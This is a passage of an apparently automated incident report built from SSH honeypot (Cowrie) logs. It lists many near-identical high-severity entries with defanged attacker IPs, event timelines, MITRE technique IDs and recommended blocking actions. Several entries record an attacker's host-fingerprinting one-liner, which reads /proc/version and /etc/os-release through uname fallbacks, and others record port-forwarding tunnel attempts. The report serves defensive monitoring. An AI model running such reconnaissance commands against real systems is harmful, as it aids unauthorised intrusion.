| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:20:23` | `cowrie.session.connect` |
| `2026-07-24 15:20:23` | `cowrie.client.version` |
| `2026-07-24 15:20:23` | `cowrie.client.kex` |
| `2026-07-24 15:20:23` | `cowrie.login.success` |
| `2026-07-24 15:20:24` | `cowrie.session.params` |
| `2026-07-24 15:20:24` | `cowrie.command.input` |
| `2026-07-24 15:20:24` | `cowrie.log.closed` |
| `2026-07-24 15:20:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47fd99af7d24

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:20 |
| **Last Seen** | 2026-07-24 15:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:20:29` | `cowrie.session.connect` |
| `2026-07-24 15:20:29` | `cowrie.client.version` |
| `2026-07-24 15:20:29` | `cowrie.client.kex` |
| `2026-07-24 15:20:29` | `cowrie.login.success` |
| `2026-07-24 15:20:30` | `cowrie.session.params` |
| `2026-07-24 15:20:30` | `cowrie.command.input` |
| `2026-07-24 15:20:30` | `cowrie.log.closed` |
| `2026-07-24 15:20:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12de5c08e7e5

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:20 |
| **Last Seen** | 2026-07-24 15:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:20:35` | `cowrie.session.connect` |
| `2026-07-24 15:20:35` | `cowrie.client.version` |
| `2026-07-24 15:20:35` | `cowrie.client.kex` |
| `2026-07-24 15:20:35` | `cowrie.login.success` |
| `2026-07-24 15:20:36` | `cowrie.session.params` |
| `2026-07-24 15:20:36` | `cowrie.command.input` |
| `2026-07-24 15:20:36` | `cowrie.log.closed` |
| `2026-07-24 15:20:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebbb7d40f7f5

| Field | Detail |
|---|---|
| **Source IP** | `138.219.13[.]21` |
| **First Seen** | 2026-07-24 15:23 |
| **Last Seen** | 2026-07-24 15:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:23:26` | `cowrie.session.connect` |
| `2026-07-24 15:23:26` | `cowrie.client.version` |
| `2026-07-24 15:23:26` | `cowrie.client.kex` |
| `2026-07-24 15:23:27` | `cowrie.login.success` |
| `2026-07-24 15:23:28` | `cowrie.direct-tcpip.request` |
| `2026-07-24 15:23:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.219.13[.]21` to AbuseIPDB if not already reported
- [ ] Block `138.219.13[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a39909733e7c

| Field | Detail |
|---|---|
| **Source IP** | `103.67.152[.]201` |
| **First Seen** | 2026-07-24 15:23 |
| **Last Seen** | 2026-07-24 15:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:23:38` | `cowrie.session.connect` |
| `2026-07-24 15:23:38` | `cowrie.client.version` |
| `2026-07-24 15:23:38` | `cowrie.client.kex` |
| `2026-07-24 15:23:40` | `cowrie.login.success` |
| `2026-07-24 15:23:41` | `cowrie.direct-tcpip.request` |
| `2026-07-24 15:23:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.152[.]201` to AbuseIPDB if not already reported
- [ ] Block `103.67.152[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf51360e2fdb

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 15:23 |
| **Last Seen** | 2026-07-24 15:24 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:23:55` | `cowrie.session.connect` |
| `2026-07-24 15:23:56` | `cowrie.client.version` |
| `2026-07-24 15:23:56` | `cowrie.client.kex` |
| `2026-07-24 15:24:00` | `cowrie.login.success` |
| `2026-07-24 15:24:02` | `cowrie.session.params` |
| `2026-07-24 15:24:02` | `cowrie.command.input` |
| `2026-07-24 15:24:02` | `cowrie.command.input` |
| `2026-07-24 15:24:02` | `cowrie.command.input` |
| `2026-07-24 15:24:02` | `cowrie.command.input` |
| `2026-07-24 15:24:02` | `cowrie.command.input` |
| `2026-07-24 15:24:02` | `cowrie.command.success` |
| `2026-07-24 15:24:02` | `cowrie.command.input` |
| `2026-07-24 15:24:03` | `cowrie.command.input` |
| `2026-07-24 15:24:03` | `cowrie.command.input` |
| `2026-07-24 15:24:03` | `cowrie.command.input` |
| `2026-07-24 15:24:03` | `cowrie.log.closed` |
| `2026-07-24 15:24:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75215bd8b1ce

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 15:25 |
| **Last Seen** | 2026-07-24 15:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:25:25` | `cowrie.session.connect` |
| `2026-07-24 15:25:26` | `cowrie.client.version` |
| `2026-07-24 15:25:26` | `cowrie.client.kex` |
| `2026-07-24 15:25:29` | `cowrie.login.success` |
| `2026-07-24 15:25:31` | `cowrie.session.params` |
| `2026-07-24 15:25:31` | `cowrie.command.input` |
| `2026-07-24 15:25:31` | `cowrie.command.input` |
| `2026-07-24 15:25:31` | `cowrie.command.input` |
| `2026-07-24 15:25:31` | `cowrie.command.input` |
| `2026-07-24 15:25:31` | `cowrie.command.input` |
| `2026-07-24 15:25:31` | `cowrie.command.success` |
| `2026-07-24 15:25:31` | `cowrie.command.input` |
| `2026-07-24 15:25:31` | `cowrie.command.input` |
| `2026-07-24 15:25:31` | `cowrie.command.input` |
| `2026-07-24 15:25:31` | `cowrie.command.input` |
| `2026-07-24 15:25:32` | `cowrie.log.closed` |
| `2026-07-24 15:25:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8c7cc1b704a

| Field | Detail |
|---|---|
| **Source IP** | `180.168.60[.]146` |
| **First Seen** | 2026-07-24 15:26 |
| **Last Seen** | 2026-07-24 15:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:26:42` | `cowrie.session.connect` |
| `2026-07-24 15:26:42` | `cowrie.client.version` |
| `2026-07-24 15:26:42` | `cowrie.client.kex` |
| `2026-07-24 15:26:44` | `cowrie.login.success` |
| `2026-07-24 15:26:45` | `cowrie.direct-tcpip.request` |
| `2026-07-24 15:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.168.60[.]146` to AbuseIPDB if not already reported
- [ ] Block `180.168.60[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad4456bfef20

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-07-24 15:26 |
| **Last Seen** | 2026-07-24 15:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:26:50` | `cowrie.session.connect` |
| `2026-07-24 15:26:51` | `cowrie.client.version` |
| `2026-07-24 15:26:51` | `cowrie.client.kex` |
| `2026-07-24 15:26:53` | `cowrie.login.success` |
| `2026-07-24 15:26:54` | `cowrie.direct-tcpip.request` |
| `2026-07-24 15:26:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-865b751b1503

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 15:26 |
| **Last Seen** | 2026-07-24 15:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:26:55` | `cowrie.session.connect` |
| `2026-07-24 15:26:55` | `cowrie.client.version` |
| `2026-07-24 15:26:55` | `cowrie.client.kex` |
| `2026-07-24 15:26:59` | `cowrie.login.success` |
| `2026-07-24 15:27:01` | `cowrie.session.params` |
| `2026-07-24 15:27:01` | `cowrie.command.input` |
| `2026-07-24 15:27:01` | `cowrie.command.input` |
| `2026-07-24 15:27:01` | `cowrie.command.input` |
| `2026-07-24 15:27:01` | `cowrie.command.input` |
| `2026-07-24 15:27:01` | `cowrie.command.input` |
| `2026-07-24 15:27:01` | `cowrie.command.success` |
| `2026-07-24 15:27:01` | `cowrie.command.input` |
| `2026-07-24 15:27:01` | `cowrie.command.input` |
| `2026-07-24 15:27:01` | `cowrie.command.input` |
| `2026-07-24 15:27:01` | `cowrie.command.input` |
| `2026-07-24 15:27:02` | `cowrie.log.closed` |
| `2026-07-24 15:27:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-890a4f1f5c7b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 15:28 |
| **Last Seen** | 2026-07-24 15:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:28:25` | `cowrie.session.connect` |
| `2026-07-24 15:28:25` | `cowrie.client.version` |
| `2026-07-24 15:28:25` | `cowrie.client.kex` |
| `2026-07-24 15:28:28` | `cowrie.login.success` |
| `2026-07-24 15:28:31` | `cowrie.session.params` |
| `2026-07-24 15:28:31` | `cowrie.command.input` |
| `2026-07-24 15:28:31` | `cowrie.command.input` |
| `2026-07-24 15:28:31` | `cowrie.command.input` |
| `2026-07-24 15:28:31` | `cowrie.command.input` |
| `2026-07-24 15:28:31` | `cowrie.command.input` |
| `2026-07-24 15:28:31` | `cowrie.command.success` |
| `2026-07-24 15:28:31` | `cowrie.command.input` |
| `2026-07-24 15:28:31` | `cowrie.command.input` |
| `2026-07-24 15:28:31` | `cowrie.command.input` |
| `2026-07-24 15:28:31` | `cowrie.command.input` |
| `2026-07-24 15:28:32` | `cowrie.log.closed` |
| `2026-07-24 15:28:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f503c69caa53

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 15:29 |
| **Last Seen** | 2026-07-24 15:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:29:53` | `cowrie.session.connect` |
| `2026-07-24 15:29:53` | `cowrie.client.version` |
| `2026-07-24 15:29:53` | `cowrie.client.kex` |
| `2026-07-24 15:29:56` | `cowrie.login.success` |
| `2026-07-24 15:29:58` | `cowrie.session.params` |
| `2026-07-24 15:29:58` | `cowrie.command.input` |
| `2026-07-24 15:29:58` | `cowrie.command.input` |
| `2026-07-24 15:29:58` | `cowrie.command.input` |
| `2026-07-24 15:29:58` | `cowrie.command.input` |
| `2026-07-24 15:29:58` | `cowrie.command.input` |
| `2026-07-24 15:29:58` | `cowrie.command.success` |
| `2026-07-24 15:29:58` | `cowrie.command.input` |
| `2026-07-24 15:29:58` | `cowrie.command.input` |
| `2026-07-24 15:29:58` | `cowrie.command.input` |
| `2026-07-24 15:29:58` | `cowrie.command.input` |
| `2026-07-24 15:29:58` | `cowrie.log.closed` |
| `2026-07-24 15:29:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9a23c02d6cb

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 15:31 |
| **Last Seen** | 2026-07-24 15:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:31:20` | `cowrie.session.connect` |
| `2026-07-24 15:31:20` | `cowrie.client.version` |
| `2026-07-24 15:31:20` | `cowrie.client.kex` |
| `2026-07-24 15:31:23` | `cowrie.login.success` |
| `2026-07-24 15:31:25` | `cowrie.session.params` |
| `2026-07-24 15:31:25` | `cowrie.command.input` |
| `2026-07-24 15:31:25` | `cowrie.command.input` |
| `2026-07-24 15:31:25` | `cowrie.command.input` |
| `2026-07-24 15:31:25` | `cowrie.command.input` |
| `2026-07-24 15:31:25` | `cowrie.command.input` |
| `2026-07-24 15:31:25` | `cowrie.command.success` |
| `2026-07-24 15:31:25` | `cowrie.command.input` |
| `2026-07-24 15:31:25` | `cowrie.command.input` |
| `2026-07-24 15:31:25` | `cowrie.command.input` |
| `2026-07-24 15:31:25` | `cowrie.command.input` |
| `2026-07-24 15:31:26` | `cowrie.log.closed` |
| `2026-07-24 15:31:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c557493bf317

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 15:32 |
| **Last Seen** | 2026-07-24 15:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:32:48` | `cowrie.session.connect` |
| `2026-07-24 15:32:49` | `cowrie.client.version` |
| `2026-07-24 15:32:49` | `cowrie.client.kex` |
| `2026-07-24 15:32:52` | `cowrie.login.success` |
| `2026-07-24 15:32:53` | `cowrie.session.params` |
| `2026-07-24 15:32:53` | `cowrie.command.input` |
| `2026-07-24 15:32:53` | `cowrie.command.input` |
| `2026-07-24 15:32:53` | `cowrie.command.input` |
| `2026-07-24 15:32:53` | `cowrie.command.input` |
| `2026-07-24 15:32:53` | `cowrie.command.input` |
| `2026-07-24 15:32:53` | `cowrie.command.success` |
| `2026-07-24 15:32:53` | `cowrie.command.input` |
| `2026-07-24 15:32:53` | `cowrie.command.input` |
| `2026-07-24 15:32:53` | `cowrie.command.input` |
| `2026-07-24 15:32:53` | `cowrie.command.input` |
| `2026-07-24 15:32:54` | `cowrie.log.closed` |
| `2026-07-24 15:32:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05a58a436643

| Field | Detail |
|---|---|
| **Source IP** | `111.171.125[.]94` |
| **First Seen** | 2026-07-24 15:33 |
| **Last Seen** | 2026-07-24 15:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:33:25` | `cowrie.session.connect` |
| `2026-07-24 15:33:26` | `cowrie.client.version` |
| `2026-07-24 15:33:26` | `cowrie.client.kex` |
| `2026-07-24 15:33:28` | `cowrie.login.success` |
| `2026-07-24 15:33:29` | `cowrie.direct-tcpip.request` |
| `2026-07-24 15:33:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.171.125[.]94` to AbuseIPDB if not already reported
- [ ] Block `111.171.125[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d17663edcf62

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 15:34 |
| **Last Seen** | 2026-07-24 15:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:34:16` | `cowrie.session.connect` |
| `2026-07-24 15:34:17` | `cowrie.client.version` |
| `2026-07-24 15:34:17` | `cowrie.client.kex` |
| `2026-07-24 15:34:19` | `cowrie.login.success` |
| `2026-07-24 15:34:20` | `cowrie.session.params` |
| `2026-07-24 15:34:20` | `cowrie.command.input` |
| `2026-07-24 15:34:20` | `cowrie.command.input` |
| `2026-07-24 15:34:20` | `cowrie.command.input` |
| `2026-07-24 15:34:20` | `cowrie.command.input` |
| `2026-07-24 15:34:20` | `cowrie.command.input` |
| `2026-07-24 15:34:20` | `cowrie.command.success` |
| `2026-07-24 15:34:20` | `cowrie.command.input` |
| `2026-07-24 15:34:20` | `cowrie.command.input` |
| `2026-07-24 15:34:20` | `cowrie.command.input` |
| `2026-07-24 15:34:20` | `cowrie.command.input` |
| `2026-07-24 15:34:21` | `cowrie.log.closed` |
| `2026-07-24 15:34:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ea1910dd6c3

| Field | Detail |
|---|---|
| **Source IP** | `220.161.52[.]149` |
| **First Seen** | 2026-07-24 15:34 |
| **Last Seen** | 2026-07-24 15:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:34:25` | `cowrie.session.connect` |
| `2026-07-24 15:34:26` | `cowrie.client.version` |
| `2026-07-24 15:34:26` | `cowrie.client.kex` |
| `2026-07-24 15:34:28` | `cowrie.login.success` |
| `2026-07-24 15:34:29` | `cowrie.direct-tcpip.request` |
| `2026-07-24 15:34:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.161.52[.]149` to AbuseIPDB if not already reported
